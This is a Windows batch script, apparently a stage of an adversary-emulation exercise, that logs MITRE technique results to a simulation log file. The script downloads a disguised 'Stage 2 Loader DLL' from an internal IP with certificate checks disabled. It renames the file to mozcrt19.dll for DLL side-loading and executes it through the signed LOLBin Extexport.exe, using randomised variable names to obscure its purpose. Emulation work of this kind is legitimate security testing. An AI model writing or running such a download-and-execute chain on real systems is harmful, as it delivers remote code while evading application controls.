@echo off
SETLOCAL EnableDelayedExpansion
SETLOCAL EnableExtensions

REM ============================================================================
REM Declare random-named SET variables for all PHR placeholders
REM ============================================================================
SET qnzfkrt=%APPDATA%\10567\61a52b03
SET bxwtyjp=371ef99a.txt
SET lvkdmso=https://10.0.0.49/stage/2/icon.png?10567-7
SET gciwrea=BALAM-S2B
SET hpaeztn=10567
SET xmudjvi=7
SET yofkzcn=%PUBLIC%\\macula-simulations.log

REM Cache a single timestamp for debug lines
SET ts=%DATE%/%TIME%

REM ============================================================================
REM Debug: heartbeat start
REM ============================================================================
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: heartbeat_start>> "!yofkzcn!" 2>nul

REM ============================================================================
REM Step 1: Heartbeat fetch – download the Stage 2 Loader DLL
REM ============================================================================
curl -k -s -o "!qnzfkrt!\!bxwtyjp!" "!lvkdmso!"

echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: heartbeat_complete>> "!yofkzcn!" 2>nul

REM ============================================================================
REM Step 2: Change working directory to the Loader's location
REM ============================================================================
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: chdir_start>> "!yofkzcn!" 2>nul
cd /d "!qnzfkrt!" >nul 2>&1
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: chdir_result=%ERRORLEVEL%>> "!yofkzcn!" 2>nul

REM ============================================================================
REM Step 3: Rename the downloaded file to mozcrt19.dll for DLL side-loading
REM ============================================================================
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: rename_start>> "!yofkzcn!" 2>nul
rename "!bxwtyjp!" mozcrt19.dll >nul 2>&1
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: rename_result=%ERRORLEVEL%>> "!yofkzcn!" 2>nul

REM ============================================================================
REM Step 4: Execute the Loader DLL via the signed LOLBin (Extexport.exe)
REM ============================================================================
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: extexport_start>> "!yofkzcn!" 2>nul
%SystemRoot%\System32\Extexport.exe "!qnzfkrt!" foo bar >nul 2>&1
set extexport_err=%ERRORLEVEL%
echo [!ts!][DEBUG][!gciwrea!][!hpaeztn!]: extexport_result=!extexport_err!>> "!yofkzcn!" 2>nul

REM ============================================================================
REM TTP log for the LOLBin proxy execution
REM ============================================================================
if !extexport_err! equ 0 (
    echo [!ts!][TTP][!gciwrea!][!hpaeztn!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!yofkzcn!"
) else (
    echo [!ts!][TTP][!gciwrea!][!hpaeztn!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!yofkzcn!"
)

REM ============================================================================
REM Terminate – the script’s job is done
REM ============================================================================
ENDLOCAL
exit /b 0